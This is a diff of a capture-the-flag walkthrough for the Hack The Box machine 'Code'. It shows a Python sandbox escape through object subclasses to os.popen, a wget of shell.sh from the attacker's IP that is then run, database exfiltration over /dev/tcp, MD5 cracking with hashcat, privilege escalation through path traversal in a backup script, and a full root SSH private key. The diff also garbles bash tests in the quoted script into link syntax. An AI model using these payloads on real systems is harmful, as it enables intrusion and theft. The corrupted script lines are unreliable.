@@ -1,7 +1,7 @@
 # Reconnaissance
 ## Nmap Enumeration
 - We pass the commands:
-	```bash
+	```
 nmap -sV -sC -vv 10.10.11.62
 nmap -sU --top-ports=10 -vv 10.10.11.62
 
@@ -68,7 +68,7 @@ n/a
 		- For `os` in import("os") it would require " at the end instead of ' like `'__imp'+'ort__("o'+'s")'`
 
 - First to see if the above explanation is actually seen:
-	```bash
+	```
 x=''.__class__
 print(x)
 ----
@@ -96,7 +96,7 @@ Too big
 ```
 - From here we create a loop to access `__init__.__globals__` and search for the `__builtin__` dictionary to find the eval function..
 	- And if it finds the eval, function it executes out code.
-		```bash
+		```
 x = ''.__class__.__bases__[0].__subclasses__()
 for i in range(len(x)):
     try:
@@ -112,7 +112,7 @@ for i in range(len(x)):
 			- without it `'` would close the string and not take the remaining argument.
 - To further understand the above loop, let's try to find which subclass location has eval first and then we can pass a simply command like ls to see it's output.
 	- To find subclass locations with eval:
-		```bash
+		```
 x = ''.__class__.__bases__[0].__subclasses__() 
 for i in range(len(x)):
     try:
@@ -135,7 +135,7 @@ for i in range(len(x)):
 				- if there is, it will print i
 					- i is the subclass number where eval exists.
 	- A more cleaner code (remove `break` to see all subclass locations, for now it shows just 1):
-		```bash
+		```
 for i, subclass in enumerate(''.__class__.__bases__[0].__subclasses__()):
     try:
         g = subclass.__init__.__globals__
@@ -149,7 +149,7 @@ for i, subclass in enumerate(''.__class__.__bases__[0].__subclasses__()):
 80
 ```
 - We can use any of those subclass numbers to pass our eval function:
-	```bash
+	```
 x = ''.__class__.__bases__[0].__subclasses__()[445].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").sy'+'stem("ls /")')
 print(x)
 
@@ -158,7 +158,7 @@ print(x)
 ```
 	- I try to pass ls command and get an output 0. This implies the command ran successfully but since system doesn't print output just responds in 0 and 1 we don't really see the / directory.
 	- Instead we can use the `popen("<command>").read()` command
-		```bash
+		```
 x=''.__class__.__bases__[0].__subclasses__()[516].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("ls /").re'+'ad()')
 print(x)
 
@@ -168,14 +168,14 @@ bin boot dev etc home lib lib32 lib64 libx32 lost+found media mnt opt proc root 
 -------
 - Alternatively you can write a file and call it (reference: https://www.hyhforever.top/htb-code/)
 	- Write the file and host a python server in local machine in that directory with file (`python3 -m http.server 80`)
-		```bash
+		```
 print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("wget 10.10.14.25/shell.sh -O /tmp/shell.sh").re'+'ad()'))
  
 print(''.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__buil'+'tins__']['ev'+'al']('__imp'+'ort__("o'+'s").po'+'pen("bash /tmp/shell.sh").re'+'ad()'))
 ```
 	- popen seems like a better option as we can capture the output whereas system just responds with 0 and 1
 		- So to refine our command
-			```bash
+			```
 x = ''.__class__.__bases__[0].__subclasses__()
 for i in range(len(x)):
     try:
@@ -195,7 +195,7 @@ for i in range(len(x)):
 ## Lateral Movement
 - In user's folder we find database.db in app>instances folder
 - We get it to our local machine :
-	```bash
+	```
 cat database.db > /dev/tcp/10.10.14.25/9998 0>&1
 
 ---ON-LOCAL-MACHINE---
@@ -212,7 +212,7 @@ id|username|password
 2|martin|3de6f30c4a09c27fc71932bfc68474be
 ```
 	- checked the length:
-		```bash
+		```
 echo -n "759b74ce43947f5f4c91aeddc3e5bad3" | wc -c
 
 ---OUTPUT---
@@ -220,7 +220,7 @@ echo -n "759b74ce43947f5f4c91aeddc3e5bad3" | wc -c
 ```
 		- possible MD5
 - Cracked via : https://crackstation.net/ or hashcat (save hash to filename hash)
-	```bash
+	```
 hashcat -m 0 hash /usr/share/wordlists/rockyou.txt
 hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show 
 
@@ -232,7 +232,7 @@ hashcat -m 0 hash /usr/share/wordlists/rockyou.txt --show
 -----
 ## Privilege Escalation
 - we pass 
-	```bash
+	```
 sudo -l
 
 ---OUTPUT---
@@ -243,28 +243,28 @@ User martin may run the following commands on localhost:
     (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
 ```
 - I pass the command:
-	```bash
+	```
 sudo /usr/bin/backy.sh
 
 ---OUTPUT---
 Usage: /usr/bin/backy.sh <task.json>
 ```
 - Reading backy.sh
-	```bash
+	```
 cat /usr/bin/backy.sh 
 
 
 ---OUTPUT---
 #!/bin/bash
 
-if [[ $# -ne 1 ]]; then
+if [](%20$#%20-ne%201%20); then
     /usr/bin/echo "Usage: $0 <task.json>"
     exit 1
 fi
 
 json_file="$1"
 
-if [[ ! -f "$json_file" ]]; then
+if [ ! -f "$json_file" ](%20!%20-f%20"$json_file"%20); then
     /usr/bin/echo "Error: File '$json_file' not found."
     exit 1
 fi
@@ -280,7 +280,7 @@ directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.direct
 is_allowed_path() {
     local path="$1"
     for allowed_path in "${allowed_paths[@]}"; do
-        if [[ "$path" == $allowed_path* ]]; then
+        if [ "$path" == $allowed_path* ](%20"$path"%20==%20$allowed_path*%20); then
             return 0
         fi
     done
@@ -312,7 +312,7 @@ done
 }
 ```
 	- Pass the command (FAILS)
-		```bash
+		```
 sudo /usr/bin/backy.sh task.json
 2025/04/27 22:35:43 🍀 backy 1.2
 2025/04/27 22:35:43 📋 Working with task.json ...
@@ -337,11 +337,11 @@ sudo /usr/bin/backy.sh task.json
 		- initially i put `["/home/martin"]` and it failed as putting `[]` makes it an array and it needs a string.
 		- Cleaner to use `..././` but i initiallu used the above hence that's what is pasted
 - We find a zip file and unzip it:
-	```bash
+	```
 tar -xjf code_home_.._root_2025_April.tar.bz2
 ```
 - We navigate to root folder that's been copied to /home/martin and read the root flag
-	```bash
+	```
 cd root
 cat root.txt
 ```
@@ -356,7 +356,7 @@ cat root.txt
 }
 ```
 	- `id_rsa`
-		```bash
+		```
 tar -xjf code_home_.._root_.ssh_id_rsa_2025_April.tar.bz2
 cd /root/.ssh/
 cat id_rsa
@@ -402,7 +402,7 @@ hdENGN+hVCh//jFwAAAAlyb290QGNvZGU=
 -----END OPENSSH PRIVATE KEY-----
 ```
 	- Copy the file to local machine and set permissions
-		```bash
+		```
 vi root_id_rsa # copy key here
 chmod 0600 root_id_rsa
 ssh -i root_id_rsa root@10.10.11.62
